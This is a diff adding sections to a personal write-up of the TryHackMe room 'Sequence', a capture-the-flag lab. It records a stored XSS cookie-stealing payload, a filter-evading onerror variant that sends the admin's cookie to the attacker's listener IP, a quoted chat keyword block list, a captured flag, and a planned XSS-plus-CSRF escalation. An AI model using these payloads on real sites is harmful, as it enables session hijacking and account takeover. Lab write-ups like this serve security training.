@@ -2,7 +2,9 @@
 
 **Difficulty:** Hard
 **Operating System:** Linux
+**Attacker IP:** 192.168.180.79
 **Machine IP:** 10.114.131.93
+**Domain:** review.thm
 **Room Link:** https://tryhackme.com/room/sequence
 
 ---
@@ -74,10 +76,27 @@ Internal Files discovered: /finance.php, /lottery.php.
 
 Potential Architecture: Internal network 192.x (possible Docker environment or SSRF vulnerability).
 
-http://10.114.131.93/phpmyadmin/ 
+http://10.114.131.93/phpmyadmin/ in version 4.5.9 - not vulnerable to common attacks.
+
+### XSS
+After moving around the website, and finally adding it to hosts as review.thm (havent seen that one)  
+I thought ill use XSS via contact.php - in reason of nmap scan and "PHPSESSID: httponly flag not set"  
+Vulnerability: Stored Cross-Site Scripting (XSS).  
+Payload used: <script>new Image().src='http://<myip>>?c=' + document.cookie;</script>  
+Method: Intercepted the PHPSESSID via a local listener and replaced the browser cookie to hijack the active session of the mod user.
+**THM{M0dH@ck3dPawned007}**
 
 ## 4. Privilege Escalation
-
+As mod we can continue checking out website. We can see settings, in which we can change password, and a place to promote user to an admin. Quick recon with burp - both of them need CSRF token. We can change our own password, we can't promote ourselfs to admin role.  
+Next, we have chat. It has some words filtering, but nothing solid.
+```
+onst dangerous = ["<script>", "</script>", "onerror", "onload", "fetch", "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"];
+```
+I have tried to use the same method like previously by chaning payload to go thru filter, and managed to have a connection from admin on listener.
+```javascript
+<img src=x o&#110;error="this.src='http://192.168.180.79/'+document['coo'+'kie']">
+```
+So we know that XSS is still viable. Ill try to use XSS request forgery, and make a paylod which makes admin to change its own password, or grants me an admin role - but remember, that it needs CSRF token which we have to steal as well.
 ### User Flag
 
 
